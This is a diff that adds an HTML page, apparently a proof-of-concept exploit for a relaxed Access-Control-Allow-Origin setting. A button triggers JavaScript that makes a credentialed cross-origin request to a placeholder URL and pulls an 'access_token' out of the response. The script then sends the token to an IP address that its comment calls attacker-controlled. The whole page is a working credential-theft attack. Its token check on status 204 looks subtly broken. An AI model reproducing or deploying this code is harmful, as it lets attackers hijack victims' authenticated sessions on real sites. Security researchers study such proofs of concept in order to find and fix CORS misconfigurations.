@@ -1,0 +1,50 @@
+//stealing information from server responce with relaxed Access-Control-Allow-Origin setting. can steal responce body or header contents
+//cannot steal "Set-Cookie" header  - security issue in browsers when trying to parse this header
+
+<html>
+<head>
+<script>
+function stealtoken()
+{
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.open("GET", "https:\/\/URL_HERE", false); //put url here
+xmlhttp.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
+xmlhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+xmlhttp.withCredentials = true;
+var body = "";
+var aBody = new Uint8Array(body.length);
+for (var i = 0; i < aBody.length; i++)
+        aBody[i] = body.charCodeAt(i); 
+        xmlhttp.send(new Blob([aBody]));
+if(xmlhttp.status==204)
+{
+var str=xmlhttp.responseText;
+var a=str.search("access_token"); //This will search the complete response text for string 'access_token'
+var token=str.substring(a+28,a+60);
+var url = "http://10.30.0.167/token=" + encodeURIComponent(token); //This will send the extracted CSRF token to attacker's controlled URL.
+xmlhttp.open("GET", url, true);
+xmlhttp.send();
+}
+}
+</script>
+</head>
+<body>
+<form action="#">
+
+      <input type="button" value="action!" onclick="stealtoken();" />
+
+    </form>
+
+</body>
+</html>
+
+
+
